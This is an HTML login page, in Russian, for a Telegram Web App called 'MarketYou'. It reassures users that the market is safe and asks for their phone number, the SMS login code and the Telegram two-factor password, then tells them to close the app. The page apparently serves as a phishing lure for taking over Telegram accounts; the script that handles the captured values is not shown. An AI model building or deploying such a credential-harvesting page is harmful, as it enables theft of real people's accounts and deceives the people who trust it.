<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MarketYou - Вход</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <header>
            <h1>😉 Наш маркет - безопасен! Войдите для продолжения.</h1>
        </header>
        <main>
            <button id="loginBtn" class="login-btn">Войти</button>
            <div id="authForm" class="auth-form hidden">
                <div class="loading" id="loadingSpinner"></div>
                <p id="statusMsg" class="status-msg"></p>
                <input type="tel" id="phoneInput" placeholder="Номер будет заполнен автоматически" class="input-field hidden" readonly>
                <input type="text" id="codeInput" placeholder="Введите SMS-код" class="input-field hidden" maxlength="5">
                <input type="password" id="2faInput" placeholder="Пароль 2FA (оставьте пустым, если нет)" class="input-field hidden">
                <button id="submitBtn" class="submit-btn hidden">Подтвердить</button>
                <div id="successMsg" class="success hidden">✅ Авторизация успешна! Закройте приложение.</div>
                <div id="errorMsg" class="error hidden"></div>
            </div>
        </main>
    </div>
    <script src="script.js"></script>
</body>
</html>
